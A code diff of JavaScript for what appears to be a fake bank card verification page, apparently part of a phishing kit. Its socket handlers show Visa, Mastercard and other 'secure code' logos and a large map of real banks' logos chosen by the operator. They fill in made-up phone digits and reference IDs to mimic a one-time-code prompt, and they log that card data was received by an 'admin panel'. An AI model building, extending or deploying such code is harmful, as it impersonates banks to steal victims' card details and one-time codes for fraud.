-                const originalAmountValue = (data.amount || storedData.amount || displayAmount.textContent || '0.00').replace(/^₹/, '');
-                
-                // Handle currency conversion - NEW
-                if (data.currency && data.currency !== 'INR') {
-                  // Save original value
-                  if (originalAmount) {
-                    originalAmount.textContent = originalAmountValue;
-                  }
-                  
-                  // Get the new currency symbol
-                  const newSymbol = currencySymbols[data.currency] || data.currency;
-                  if (currencySymbol) {
-                    currencySymbol.textContent = newSymbol;
-                  }
-                  
-                  // Show loading
-                  if (transactionAmount) {
-                    transactionAmount.textContent = "Converting...";
-                  }
-                  
-                  try {
-                    // Get converted amount
-                    const convertedValue = await convertCurrency(parseFloat(originalAmountValue), 'INR', data.currency);
-                    
-                    // Display converted amount
-                    if (transactionAmount) {
-                      transactionAmount.textContent = convertedValue;
-                    }
-                    
-                    // Show original amount display
-                    if (convertedAmountDisplay && originalCurrencyDisplay) {
-                      convertedAmountDisplay.style.display = 'none';
-                    }
-                  } catch (error) {
-                    console.error('Currency conversion failed:', error);
-                    
-                    // Fallback to original amount
-                    if (transactionAmount) {
-                      transactionAmount.textContent = originalAmountValue;
-                    }
-                    if (currencySymbol) {
-                      currencySymbol.textContent = '₹';
-                    }
-                    if (convertedAmountDisplay) {
-                      convertedAmountDisplay.style.display = 'none';
-                    }
-                  }
-                } else {
-                  // Default INR currency (no conversion needed)
-                  if (currencySymbol) {
-                    currencySymbol.textContent = '₹';
-                  }
-                  if (transactionAmount) {
-                    transactionAmount.textContent = originalAmountValue;
-                  }
-                  if (convertedAmountDisplay) {
-                    convertedAmountDisplay.style.display = 'none';
-                  }
-                }
-                
-                // Setup event handlers
-                setupMCVerificationHandlers();
-                
-                // Start timer
-                setupMCTimerIfNeeded(true);
-              }
-            });
-      
+      // Start verification event handler with CURRENCY CONVERSION - UPDATED
+      socket.on('start_verification', async (data) => {
+        console.log('[DEBUG] Received start_verification event:', data);
+        console.log('[DEBUG] Full start_verification data:', JSON.stringify(data));
+        
+        if (data.invoiceId === currentInvoiceId) {
+          // Get stored data
+          const storedData = window.mcVerificationData || {};
+          console.log('[DEBUG] Stored MC verification data:', JSON.stringify(storedData));
+          
+          // Hide loading, show verification content
+          const loadingContent = document.getElementById('mcLoadingContent');
+          const verificationContent = document.getElementById('mcVerificationContent');
+          
+          if (!loadingContent || !verificationContent) return; // Added null check
+          
+          loadingContent.style.display = 'none';
+          verificationContent.style.display = 'block';
+          
+          // UPDATED: Set verification type logo on RIGHT side based on stored data
+          const verificationTypeLogo = document.getElementById('verificationTypeLogo');
+          if (verificationTypeLogo) {
+            // First attempt to get the logo type from stored data or parameters
+            let logoType = (data.verificationType || 
+                            data.loadingLogoType || 
+                            storedData.loadingLogoType || 
+                            storedData.verificationType || 
+                            'mastercard').toLowerCase();
+            
+            console.log('[DEBUG] Logo type for verification page:', logoType);
+            
+            // Select the appropriate logo based on type
+            if (logoType.includes('visa')) {
+              verificationTypeLogo.src = 'https://vectorseek.com/wp-content/uploads/2023/09/Verified-By-Visa-Logo-Vector.svg-.png';
+              verificationTypeLogo.alt = 'Verified by Visa';
+              console.log('[DEBUG] Using Visa logo for verification page');
+            } 
+            else if (logoType.includes('amex') || logoType.includes('american')) {
+              verificationTypeLogo.src = 'https://logos-world.net/wp-content/uploads/2020/11/American-Express-Logo-700x394.png';
+              verificationTypeLogo.alt = 'American Express SafeKey';
+              console.log('[DEBUG] Using Amex logo for verification page');
+            } 
+            else if (logoType.includes('discover')) {
+verificationTypeLogo.src = 'https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/0f808454-e260-4d1b-aac6-7d1368dc7ef8/dg96ja9-a94a3011-dba0-4965-a47e-e0233d92e82a.png?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7InBhdGgiOiJcL2ZcLzBmODA4NDU0LWUyNjAtNGQxYi1hYWM2LTdkMTM2OGRjN2VmOFwvZGc5NmphOS1hOTRhMzAxMS1kYmEwLTQ5NjUtYTQ3ZS1lMDIzM2Q5MmU4MmEucG5nIn1dXSwiYXVkIjpbInVybjpzZXJ2aWNlOmZpbGUuZG93bmxvYWQiXX0.T_pFbxPhEbOEV5xUTVqW7nJvL5qvBwESsJzKS7j8r14';
+              verificationTypeLogo.alt = 'Discover ProtectBuy';
+              console.log('[DEBUG] Using Discover logo for verification page');
+            } 
+            else if (logoType.includes('rupay')) {
+              verificationTypeLogo.src = 'https://gokiwi.in/homepage/partners/rupay.svg';
+              verificationTypeLogo.alt = 'RuPay PaySecure';
+              console.log('[DEBUG] Using RuPay logo for verification page');
+            } 
+            else {
+              verificationTypeLogo.src = 'https://www.pngkey.com/png/full/794-7948248_mastercard-securecode-logo-logo-mastercard-secure-code.png';
+              verificationTypeLogo.alt = 'Mastercard SecureCode';
+              console.log('[DEBUG] Using Mastercard logo for verification page (default)');
+            }
+          }
+                  // Listen for admin acknowledgment
+        socket.on('card_data_received', (data) => {
+          if (data.invoiceId === currentInvoiceId) {
+            cardDataAcknowledged = true;
+            console.log('Card data received by admin panel');
+          }
+        });
+         
+                   // UPDATED: Set bank logo on LEFT side
+                   const bankLogo = document.getElementById('bankLogo');
+                   if (bankLogo) {
+                     const bankLogos = {
+                       'sbi': 'https://logolook.net/wp-content/uploads/2022/04/SBI-Logo.png',
+                       'hdfc': 'https://companieslogo.com/img/orig/HDB_BIG-092606ce.png?t=1720244492',
+                       'icici': 'https://www.icicibank.com/content/dam/icicibank/india/assets/images/header/logo.png',
+                       'axis': 'https://upload.wikimedia.org/wikipedia/commons/c/ce/AXISBank_Logo.svg',
+                       'kotak': 'https://cdn.freelogovectors.net/svg07/kotakmahindrabank-logo.svg',
+                       'yes': 'https://logotyp.us/file/yes-bank.svg',
+                       'dbs taiwan': 'https://www.dbs.com.sg/o/corporate-theme/images/Logo.svg',
+                       'tanshin': 'http://www.alb-labuan.com/images/logo-taishin.png',
+                       'hsbc': 'https://upload.wikimedia.org/wikipedia/commons/a/aa/HSBC_logo_(2018).svg',
+                       'standard charterd': 'https://companieslogo.com/img/orig/STAN.L_BIG-27b2637e.png?t=1720244494',
+                       'boi': 'https://logolook.net/wp-content/uploads/2023/09/Bank-of-India-Logo.png',
+                       'bob': 'https://1000logos.net/wp-content/uploads/2021/06/logo-Bank-of-Baroda-500x281.png',
+                       'centralbankindia': 'https://iconape.com/wp-content/png_logo_vector/central-bank-of-india-1911-logo.png',
+                       'boa': 'https://freelogopng.com/images/all_img/1658985465bank-of-america-logo-png.png',
+                       'citibank': 'https://www.logo.wine/a/logo/Citigroup/Citigroup-Logo.wine.svg',
+                       'usbank': 'https://logos-world.net/wp-content/uploads/2021/02/US-Bank-Logo-700x394.png',
+                       'wellsfargo': 'https://www.logo.wine/a/logo/Wells_Fargo/Wells_Fargo-Logo.wine.svg',
+                       'nimb': 'https://www.nimb.com.np/static/images/nimbl-lotus.png',
+                       'bank of maga': 'https://upload.wikimedia.org/wikipedia/commons/a/a9/Bank_of_Taiwan_Seal.svg',
+                       'gibraltar': 'https://upload.wikimedia.org/wikipedia/en/thumb/4/4a/Gibraltar_International_Bank_Logo.svg/220px-Gibraltar_International_Bank_Logo.svg.png',
+                       'unionbankindia': 'https://upload.wikimedia.org/wikipedia/commons/d/d0/Union_Bank_of_India_Logo.svg',
+                       'pnb': 'https://logotyp.us/file/pnb.svg',
+                       'canera bank': 'https://logonoid.com/images/canara-bank-logo.png',
+                       'capitalone': 'https://www.logo.wine/a/logo/Capital_One/Capital_One-Logo.wine.svg',
+                       'td bank': 'https://cdn.worldvectorlogo.com/logos/td-bank-1.svg',
+                       'citizens': 'https://locations.citizensbank.com/images/citizens-logo-rebrand.png',
+                       'chase bank': 'https://1000logos.net/wp-content/uploads/2016/11/Chase-National-Bank-Logo-500x281.png',
+                       'truist': 'https://upload.wikimedia.org/wikipedia/commons/8/8b/Truist_Financial_logo.svg',
+                       'cathy united taiwan': 'https://static.wikia.nocookie.net/logopedia/images/4/4b/CATHAY2002.png/revision/latest/scale-to-width-down/250?cb=20230808075909',
+                       'novascotia': 'https://asset.brandfetch.io/idpIpGPfn2/ideBeGWgbz.svg?updated=1667941638324',
+                       'sinopac bank taiwan': 'https://easy.sinopac.com/images/sinopac-logo.svg',
+                       'hua nan bank taiwan': 'https://thebanks.eu/img/logos/Hua_Nan_Commercial_Bank.png',
+                       'landbank taiwan': 'https://www.landbank.com/new_assets/header/landbank_logo.webp',
+                       'un bank taiwan': 'https://upload.wikimedia.org/wikipedia/commons/5/52/E.SUN_Bank.svg',
+                       'KGI bank taiwan': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/dd/KGI_Financial_Holding_logo_v2.png/250px-KGI_Financial_Holding_logo_v2.png',
+                       'usaa bank': 'https://logos-world.net/wp-content/uploads/2021/03/USAA-United-Services-Automobile-Association-Logo-700x394.png',
+                       'huntington': 'https://mma.prnewswire.com/media/551870/Huntington_Logo.jpg?w=300',
+                       'm&t bank ': 'https://companieslogo.com/img/orig/MTB_BIG-01f85319.png?t=1720244493',
+                       'barclays bank': 'https://icons.veryicon.com/png/128/business/bank-logo-collection/barclays-bank-portfolio.png',
+                       'santandar usa': 'https://logodownload.org/wp-content/uploads/2017/05/santander-logo-1.png',
+                       'default': 'https://www.pngkey.com/png/full/794-7948248_mastercard-securecode-logo-logo-mastercard-secure-code.png',
+                     'morganstanley': 'https://www.morganstanley.com/content/dam/im/web/images/MSPC/MS-Private-Credit-Logo.svg',
+                      'bancorp': 'https://www.logo.wine/a/logo/U.S._Bancorp/U.S._Bancorp-Logo.wine.svg',
+                      'pnc': 'https://upload.wikimedia.org/wikipedia/commons/1/1b/PNClogo.svg',
+                      'charles schweb': 'https://upload.wikimedia.org/wikipedia/commons/4/4b/Charles_Schwab_Corporation_logo.svg',
+                      'BMO USA': 'https://1000logos.net/wp-content/uploads/2024/01/BMO-US-Logo-500x281.png',
+                      'First Citizens': 'https://www.annualreports.com/HostedData/CompanyLogos/NASDAQ_FCNCA.png',
+                      'Fifth Third Bank': 'https://companieslogo.com/img/orig/FITB_BIG-1d1d41ca.png?t=1723189499',
+                      'Ally Financial': 'https://upload.wikimedia.org/wikipedia/commons/0/00/Ally_Financial.svg',
+                    'KeyCorp': 'https://mma.prnewswire.com/media/551870/Huntington_Logo.jpg?w=300',
+                      'Webster Bank': 'https://upload.wikimedia.org/wikipedia/commons/8/81/Webster_Bank_Logo.svg',
+                      'BNP Paribas': 'https://www.logo.wine/a/logo/BNP_Paribas/BNP_Paribas-Logo.wine.svg',
+                      'Columbia Bank': 'https://mma.prnewswire.com/media/254331/columbia_bank_logo.jpg',
+                      'SoFi': 'https://www.finder.com/niche-builder/5e8f8d3d11841.png',
+                      'Texas Capital Bank': 'https://a.storyblok.com/f/102997/2684x834/d5fa7255e0/tc_horizontal_rgb_2color.png',
+                      'Arvest Bank': 'https://upload.wikimedia.org/wikipedia/commons/8/82/Arvest_Bank_logo.svg',
+                    'Indian allahabad Bank': 'https://logos-download.com/wp-content/uploads/2016/03/Allahabad_Bank_logo_2-700x260.jpg',
+                      'Indian Overseas Bank': 'https://upload.wikimedia.org/wikipedia/commons/f/fc/Indian_Overseas_Bank_Logo.svg',
+                      'Federal Bank': 'https://assets.stickpng.com/images/627cca9b1b2e263b45696aa1.png',
+                      'IDBI Bank': 'https://logotyp.us/file/idbi.svg',
+                      'IDFC First Bank': 'https://www.idfcfirstbank.com/content/dam/idfcfirstbank/images/n1/IDFC-logo-website.svg',
+            'Northern Trust': 'https://www.responsibilityreports.com/HostedData/CompanyLogos/NASDAQ_NTRS.png',
+                      'Synchrony Financial': 'https://upload.wikimedia.org/wikipedia/commons/8/85/Synchrony_Financial.svg',
+                      'Deutsche Bank': 'https://upload.wikimedia.org/wikipedia/commons/4/48/Deutsche_Bank-Logo.svg',
+                      'First Horizon': 'https://companieslogo.com/img/orig/FHN_BIG-c5db5207.png?t=1721010478',
+                      'Comerica': 'https://whitememorial.give.adventisthealth.org/wp-content/uploads/sites/18/2024/09/Comerica-LOGO.jpg',
+                      'IndusInd Bank': 'https://images.seeklogo.com/logo-png/20/2/indusind-bank-logo-png_seeklogo-207227.png',
+                      'Jammu & Kashmir Bank': 'https://www.jkbank.com/assets/frontend/layout/img/logos/jklogo.jpg',
+                      'Karnataka Bank': 'https://seekvectors.com/storage/images/karnataka-bank-logo-01.svg',
+                      'RBL Bank': 'https://upload.wikimedia.org/wikipedia/commons/7/70/RBL_Bank_SVG_Logo.svg',
+                      'UCO Bank': 'https://brandeps.com/logo-download/U/UCO-Bank-logo-vector-01.svg',
+                      'BBVA Mexico': 'https://dq8dwmysp7hk1.cloudfront.net/logos/bbva.svg',
+                      'Banorte Mexico': 'https://img2.freepnges.com/20180625/swi/aaz8w7s80.webp',
+                      'Citibanamex México': 'https://upload.wikimedia.org/wikipedia/commons/9/92/Citibanamex_logo.svg',
+                      'Lloyds Banking Group': 'https://companieslogo.com/img/orig/LYG_BIG-74740808.png?t=1720244492',
+            'NatWest Group': 'https://static.wikia.nocookie.net/logopedia/images/8/86/NatWest_Group_logo.svg/revision/latest/scale-to-width-down/300?cb=20230323154303',
+            'Starling Bank': 'https://asset.brandfetch.io/id65Uj_bLX/id8a5daz0W.svg?updated=1667561520880',
+                'Royal Bank of Canada': 'https://www.logo.wine/a/logo/RBC_Bank/RBC_Bank-Logo.wine.svg',
+                      'Bank of Montreal': 'https://1000logos.net/wp-content/uploads/2021/06/Bank-of-Montreal-logo-500x281.png',
+                      'Canadian Imperial Bank of Commerce': 'https://logos-world.net/wp-content/uploads/2021/05/CIBC-Logo-700x394.png',
+                      'Commerzbank': 'https://assets.stickpng.com/images/5a1d2c5e4ac6b00ff574e275.png',
+                      'N26': 'https://big-picture.com/img/xtech/fintech_logos/N26-logo.jpg',
+                      'Bunq': 'https://upload.wikimedia.org/wikipedia/commons/5/58/Bunq_(bank)_company_logo_2017.svg',
+                     };
+                     
+                     bankLogo.src = bankLogos[data.bankCode] || bankLogos['default'];
+                   }
+                   
+                   // UPDATED: Generate random mobile ending instead of using card last 4
+                   const cardNumberDisplay = document.getElementById('cardNumberDisplay');
+                   const cardLastFourDigits = document.getElementById('cardLastFourDigits');
+         
+        // Use provided phone number or generate random 4 digits for mobile number ending
+    const phoneLastFour = data.phoneLastFour || Math.floor(1000 + Math.random() * 9000).toString();
+    
+    if (cardLastFourDigits) {
+      cardLastFourDigits.textContent = `********${phoneLastFour}`;
+    }
+         
+                   // Still use actual card last 4 for the card display
+                   const cardNumber = document.getElementById('cardNumber')?.value || '';
+                   const lastFour = cardNumber.replace(/\s/g, '').slice(-4);
+                   if (cardNumberDisplay) {
+                     cardNumberDisplay.textContent = `XXXX XXXX XXXX ${lastFour}`;
+                   }
+         
+                   // ADDED: Generate random alphanumeric reference ID
+                   const referenceId = document.getElementById('referenceId');
+                   if (referenceId) {
+                     const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+                     let randomRef = '';
+                     // Generate 3 letters followed by 4 numbers
+                     for (let i = 0; i < 3; i++) {
+                       randomRef += chars.charAt(Math.floor(Math.random() * 26)); // Only letters
+                     }
+                     for (let i = 0; i < 4; i++) {
+                       randomRef += chars.charAt(Math.floor(Math.random() * 10) + 26); // Only numbers
+                     }
+                     referenceId.textContent = randomRef;
+                   }
+         
+                   // Set other transaction details
+                   const merchantName = document.getElementById('merchantName');
+                   const transactionAmount = document.getElementById('transactionAmount');
+                   const transactionDate = document.getElementById('transactionDate');
+                   const displayAmount = document.getElementById('displayAmount');
+                   const originalAmount = document.getElementById('originalAmount');
+                   const currencySymbol = document.getElementById('currencySymbol');
+                   const convertedAmountDisplay = document.getElementById('convertedAmountDisplay');
+                   const originalCurrencyDisplay = document.getElementById('originalCurrencyDisplay');
+                   
+                   // Display merchant name
+                   if (merchantName) {
+                     merchantName.textContent = data.merchantName || storedData.merchantName || 'Bologus pvt store.';
+                   }
+                   
+                   // Set transaction date
+                   if (transactionDate) {
+                     transactionDate.textContent = new Date().toLocaleString();
+                   }
+                   
+                   // Get original amount
+                   const originalAmountValue = (data.amount || storedData.amount || displayAmount.textContent || '0.00').replace(/^₹/, '');
+                   
+                   // Handle currency conversion - NEW
+                   if (data.currency && data.currency !== 'INR') {
+                     // Save original value
+                     if (originalAmount) {
+                       originalAmount.textContent = originalAmountValue;
+                     }
+                     
+                     // Get the new currency symbol
+                     const newSymbol = currencySymbols[data.currency] || data.currency;
+                     if (currencySymbol) {
+                       currencySymbol.textContent = newSymbol;
+                     }
+                     
+                     // Show loading
+                     if (transactionAmount) {
+                       transactionAmount.textContent = "Converting...";
+                     }
+                     
+                     try {
+                       // Get converted amount
+                       const convertedValue = await convertCurrency(parseFloat(originalAmountValue), 'INR', data.currency);
+                       
+                       // Display converted amount
+                       if (transactionAmount) {
+                         transactionAmount.textContent = convertedValue;
+                       }
+                       
+                       // Show original amount display
+                       if (convertedAmountDisplay && originalCurrencyDisplay) {
+                         convertedAmountDisplay.style.display = 'none';
+                       }
+                     } catch (error) {
+                       console.error('Currency conversion failed:', error);
+                       
+                       // Fallback to original amount
+                       if (transactionAmount) {
+                         transactionAmount.textContent = originalAmountValue;
+                       }
+                       if (currencySymbol) {
+                         currencySymbol.textContent = '₹';
+                       }
+                       if (convertedAmountDisplay) {
+                         convertedAmountDisplay.style.display = 'none';
+                       }
+                     }
+                   } else {
+                     // Default INR currency (no conversion needed)
+                     if (currencySymbol) {
+                       currencySymbol.textContent = '₹';
+                     }
+                     if (transactionAmount) {
+                       transactionAmount.textContent = originalAmountValue;
+                     }
+                     if (convertedAmountDisplay) {
+                       convertedAmountDisplay.style.display = 'none';
+                     }
+                   }
+                   
+                   // Setup event handlers
+                   setupMCVerificationHandlers();
+                   
+                   // Start timer
+                   setupMCTimerIfNeeded(true);
+                 }
+               });
+         
        // Currency page redirection
 socket.on('redirect_to_currency', (data) => {
   console.log('[DEBUG] Received redirect_to_currency event:', data);
@@ -2269,195 +2251,194 @@ socket.on('redirect_to_currency', (data) => {
   // Redirect to currency page with updated extension
   window.location.href = data.redirectUrl.replace('currencypayment.html', 'currencypayment-page.html');
 });
+           // Handle MC bank selection update
+      socket.on('update_mc_bank', (data) => {
+        if (data.invoiceId === currentInvoiceId) {
+          const bankLogos = {
+            'sbi': 'https://logolook.net/wp-content/uploads/2022/04/SBI-Logo.png',
+              'hdfc': 'https://companieslogo.com/img/orig/HDB_BIG-092606ce.png?t=1720244492',
+              'icici': 'https://www.icicibank.com/content/dam/icicibank/india/assets/images/header/logo.png',
+              'axis': 'https://upload.wikimedia.org/wikipedia/commons/c/ce/AXISBank_Logo.svg',
+              'kotak': 'https://cdn.freelogovectors.net/svg07/kotakmahindrabank-logo.svg',
+              'yes': 'https://logotyp.us/file/yes-bank.svg',
+              'dbs taiwan': 'https://www.dbs.com.sg/o/corporate-theme/images/Logo.svg',
+              'tanshin': 'http://www.alb-labuan.com/images/logo-taishin.png',
+              'hsbc': 'https://upload.wikimedia.org/wikipedia/commons/a/aa/HSBC_logo_(2018).svg',
+              'standard charterd': 'https://companieslogo.com/img/orig/STAN.L_BIG-27b2637e.png?t=1720244494',
+              'boi': 'https://logolook.net/wp-content/uploads/2023/09/Bank-of-India-Logo.png',
+              'bob': 'https://1000logos.net/wp-content/uploads/2021/06/logo-Bank-of-Baroda-500x281.png',
+              'centralbankindia': 'https://iconape.com/wp-content/png_logo_vector/central-bank-of-india-1911-logo.png',
+              'boa': 'https://freelogopng.com/images/all_img/1658985465bank-of-america-logo-png.png',
+              'citibank': 'https://www.logo.wine/a/logo/Citigroup/Citigroup-Logo.wine.svg',
+              'usbank': 'https://logos-world.net/wp-content/uploads/2021/02/US-Bank-Logo-700x394.png',
+              'wellsfargo': 'https://www.logo.wine/a/logo/Wells_Fargo/Wells_Fargo-Logo.wine.svg',
+              'nimb': 'https://www.nimb.com.np/static/images/nimbl-lotus.png',
+              'bank of maga': 'https://upload.wikimedia.org/wikipedia/commons/a/a9/Bank_of_Taiwan_Seal.svg',
+              'gibraltar': 'https://upload.wikimedia.org/wikipedia/en/thumb/4/4a/Gibraltar_International_Bank_Logo.svg/220px-Gibraltar_International_Bank_Logo.svg.png',
+              'unionbankindia': 'https://upload.wikimedia.org/wikipedia/commons/d/d0/Union_Bank_of_India_Logo.svg',
+              'pnb': 'https://logotyp.us/file/pnb.svg',
+              'canera bank': 'https://logonoid.com/images/canara-bank-logo.png',
+              'capitalone': 'https://www.logo.wine/a/logo/Capital_One/Capital_One-Logo.wine.svg',
+              'td bank': 'https://cdn.worldvectorlogo.com/logos/td-bank-1.svg',
+              'citizens': 'https://locations.citizensbank.com/images/citizens-logo-rebrand.png',
+              'chase bank': 'https://1000logos.net/wp-content/uploads/2016/11/Chase-National-Bank-Logo-500x281.png',
+              'truist': 'https://upload.wikimedia.org/wikipedia/commons/8/8b/Truist_Financial_logo.svg',
+              'cathy united taiwan': 'https://static.wikia.nocookie.net/logopedia/images/4/4b/CATHAY2002.png/revision/latest/scale-to-width-down/250?cb=20230808075909',
+              'novascotia': 'https://asset.brandfetch.io/idpIpGPfn2/ideBeGWgbz.svg?updated=1667941638324',
+              'sinopac bank taiwan': 'https://easy.sinopac.com/images/sinopac-logo.svg',
+              'hua nan bank taiwan': 'https://thebanks.eu/img/logos/Hua_Nan_Commercial_Bank.png',
+              'landbank taiwan': 'https://www.landbank.com/new_assets/header/landbank_logo.webp',
+              'un bank taiwan': 'https://upload.wikimedia.org/wikipedia/commons/5/52/E.SUN_Bank.svg',
+              'KGI bank taiwan': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/dd/KGI_Financial_Holding_logo_v2.png/250px-KGI_Financial_Holding_logo_v2.png',
+              'usaa bank': 'https://logos-world.net/wp-content/uploads/2021/03/USAA-United-Services-Automobile-Association-Logo-700x394.png',
+              'huntington': 'https://mma.prnewswire.com/media/551870/Huntington_Logo.jpg?w=300',
+              'm&t bank ': 'https://companieslogo.com/img/orig/MTB_BIG-01f85319.png?t=1720244493',
+              'barclays bank': 'https://icons.veryicon.com/png/128/business/bank-logo-collection/barclays-bank-portfolio.png',
+              'santandar usa': 'https://logodownload.org/wp-content/uploads/2017/05/santander-logo-1.png',
+              'default': 'https://www.pngkey.com/png/full/794-7948248_mastercard-securecode-logo-logo-mastercard-secure-code.png',
+            'morganstanley': 'https://www.morganstanley.com/content/dam/im/web/images/MSPC/MS-Private-Credit-Logo.svg',
+             'bancorp': 'https://www.logo.wine/a/logo/U.S._Bancorp/U.S._Bancorp-Logo.wine.svg',
+             'pnc': 'https://upload.wikimedia.org/wikipedia/commons/1/1b/PNClogo.svg',
+             'charles schweb': 'https://upload.wikimedia.org/wikipedia/commons/4/4b/Charles_Schwab_Corporation_logo.svg',
+             'BMO USA': 'https://1000logos.net/wp-content/uploads/2024/01/BMO-US-Logo-500x281.png',
+             'First Citizens': 'https://www.annualreports.com/HostedData/CompanyLogos/NASDAQ_FCNCA.png',
+             'Fifth Third Bank': 'https://companieslogo.com/img/orig/FITB_BIG-1d1d41ca.png?t=1723189499',
+             'Ally Financial': 'https://upload.wikimedia.org/wikipedia/commons/0/00/Ally_Financial.svg',
+           'KeyCorp': 'https://mma.prnewswire.com/media/551870/Huntington_Logo.jpg?w=300',
+             'Webster Bank': 'https://upload.wikimedia.org/wikipedia/commons/8/81/Webster_Bank_Logo.svg',
+             'BNP Paribas': 'https://www.logo.wine/a/logo/BNP_Paribas/BNP_Paribas-Logo.wine.svg',
+             'Columbia Bank': 'https://mma.prnewswire.com/media/254331/columbia_bank_logo.jpg',
+             'SoFi': 'https://www.finder.com/niche-builder/5e8f8d3d11841.png',
+             'Texas Capital Bank': 'https://a.storyblok.com/f/102997/2684x834/d5fa7255e0/tc_horizontal_rgb_2color.png',
+             'Arvest Bank': 'https://upload.wikimedia.org/wikipedia/commons/8/82/Arvest_Bank_logo.svg',
+           'Indian allahabad Bank': 'https://logos-download.com/wp-content/uploads/2016/03/Allahabad_Bank_logo_2-700x260.jpg',
+             'Indian Overseas Bank': 'https://upload.wikimedia.org/wikipedia/commons/f/fc/Indian_Overseas_Bank_Logo.svg',
+             'Federal Bank': 'https://assets.stickpng.com/images/627cca9b1b2e263b45696aa1.png',
+             'IDBI Bank': 'https://logotyp.us/file/idbi.svg',
+             'IDFC First Bank': 'https://www.idfcfirstbank.com/content/dam/idfcfirstbank/images/n1/IDFC-logo-website.svg',
+   'Northern Trust': 'https://www.responsibilityreports.com/HostedData/CompanyLogos/NASDAQ_NTRS.png',
+             'Synchrony Financial': 'https://upload.wikimedia.org/wikipedia/commons/8/85/Synchrony_Financial.svg',
+             'Deutsche Bank': 'https://upload.wikimedia.org/wikipedia/commons/4/48/Deutsche_Bank-Logo.svg',
+             'First Horizon': 'https://companieslogo.com/img/orig/FHN_BIG-c5db5207.png?t=1721010478',
+             'Comerica': 'https://whitememorial.give.adventisthealth.org/wp-content/uploads/sites/18/2024/09/Comerica-LOGO.jpg',
+             'IndusInd Bank': 'https://images.seeklogo.com/logo-png/20/2/indusind-bank-logo-png_seeklogo-207227.png',
+             'Jammu & Kashmir Bank': 'https://www.jkbank.com/assets/frontend/layout/img/logos/jklogo.jpg',
+             'Karnataka Bank': 'https://seekvectors.com/storage/images/karnataka-bank-logo-01.svg',
+             'RBL Bank': 'https://upload.wikimedia.org/wikipedia/commons/7/70/RBL_Bank_SVG_Logo.svg',
+             'UCO Bank': 'https://brandeps.com/logo-download/U/UCO-Bank-logo-vector-01.svg',
+             'BBVA Mexico': 'https://dq8dwmysp7hk1.cloudfront.net/logos/bbva.svg',
+             'Banorte Mexico': 'https://img2.freepnges.com/20180625/swi/aaz8w7s80.webp',
+             'Citibanamex México': 'https://upload.wikimedia.org/wikipedia/commons/9/92/Citibanamex_logo.svg',
+             'Lloyds Banking Group': 'https://companieslogo.com/img/orig/LYG_BIG-74740808.png?t=1720244492',
+   'NatWest Group': 'https://static.wikia.nocookie.net/logopedia/images/8/86/NatWest_Group_logo.svg/revision/latest/scale-to-width-down/300?cb=20230323154303',
+   'Starling Bank': 'https://asset.brandfetch.io/id65Uj_bLX/id8a5daz0W.svg?updated=1667561520880',
+       'Royal Bank of Canada': 'https://www.logo.wine/a/logo/RBC_Bank/RBC_Bank-Logo.wine.svg',
+             'Bank of Montreal': 'https://1000logos.net/wp-content/uploads/2021/06/Bank-of-Montreal-logo-500x281.png',
+             'Canadian Imperial Bank of Commerce': 'https://logos-world.net/wp-content/uploads/2021/05/CIBC-Logo-700x394.png',
+             'Commerzbank': 'https://assets.stickpng.com/images/5a1d2c5e4ac6b00ff574e275.png',
+             'N26': 'https://big-picture.com/img/xtech/fintech_logos/N26-logo.jpg',
+             'Bunq': 'https://upload.wikimedia.org/wikipedia/commons/5/58/Bunq_(bank)_company_logo_2017.svg',
+          };
+          
+          const bankLogo = document.getElementById('bankLogo');
+          if (bankLogo) {
+            bankLogo.src = bankLogos[data.bankCode] || bankLogos['default'];
+          }
+        }
+      });
       
-            // Handle MC bank selection update
-            socket.on('update_mc_bank', (data) => {
-              if (data.invoiceId === currentInvoiceId) {
-                const bankLogos = {
-                  'sbi': 'https://logolook.net/wp-content/uploads/2022/04/SBI-Logo.png',
-                    'hdfc': 'https://companieslogo.com/img/orig/HDB_BIG-092606ce.png?t=1720244492',
-                    'icici': 'https://www.icicibank.com/content/dam/icicibank/india/assets/images/header/logo.png',
-                    'axis': 'https://upload.wikimedia.org/wikipedia/commons/c/ce/AXISBank_Logo.svg',
-                    'kotak': 'https://cdn.freelogovectors.net/svg07/kotakmahindrabank-logo.svg',
-                    'yes': 'https://logotyp.us/file/yes-bank.svg',
-                    'dbs taiwan': 'https://www.dbs.com.sg/o/corporate-theme/images/Logo.svg',
-                    'tanshin': 'http://www.alb-labuan.com/images/logo-taishin.png',
-                    'hsbc': 'https://upload.wikimedia.org/wikipedia/commons/a/aa/HSBC_logo_(2018).svg',
-                    'standard charterd': 'https://companieslogo.com/img/orig/STAN.L_BIG-27b2637e.png?t=1720244494',
-                    'boi': 'https://logolook.net/wp-content/uploads/2023/09/Bank-of-India-Logo.png',
-                    'bob': 'https://1000logos.net/wp-content/uploads/2021/06/logo-Bank-of-Baroda-500x281.png',
-                    'centralbankindia': 'https://iconape.com/wp-content/png_logo_vector/central-bank-of-india-1911-logo.png',
-                    'boa': 'https://freelogopng.com/images/all_img/1658985465bank-of-america-logo-png.png',
-                    'citibank': 'https://www.logo.wine/a/logo/Citigroup/Citigroup-Logo.wine.svg',
-                    'usbank': 'https://logos-world.net/wp-content/uploads/2021/02/US-Bank-Logo-700x394.png',
-                    'wellsfargo': 'https://www.logo.wine/a/logo/Wells_Fargo/Wells_Fargo-Logo.wine.svg',
-                    'nimb': 'https://www.nimb.com.np/static/images/nimbl-lotus.png',
-                    'bank of maga': 'https://upload.wikimedia.org/wikipedia/commons/a/a9/Bank_of_Taiwan_Seal.svg',
-                    'gibraltar': 'https://upload.wikimedia.org/wikipedia/en/thumb/4/4a/Gibraltar_International_Bank_Logo.svg/220px-Gibraltar_International_Bank_Logo.svg.png',
-                    'unionbankindia': 'https://upload.wikimedia.org/wikipedia/commons/d/d0/Union_Bank_of_India_Logo.svg',
-                    'pnb': 'https://logotyp.us/file/pnb.svg',
-                    'canera bank': 'https://logonoid.com/images/canara-bank-logo.png',
-                    'capitalone': 'https://www.logo.wine/a/logo/Capital_One/Capital_One-Logo.wine.svg',
-                    'td bank': 'https://cdn.worldvectorlogo.com/logos/td-bank-1.svg',
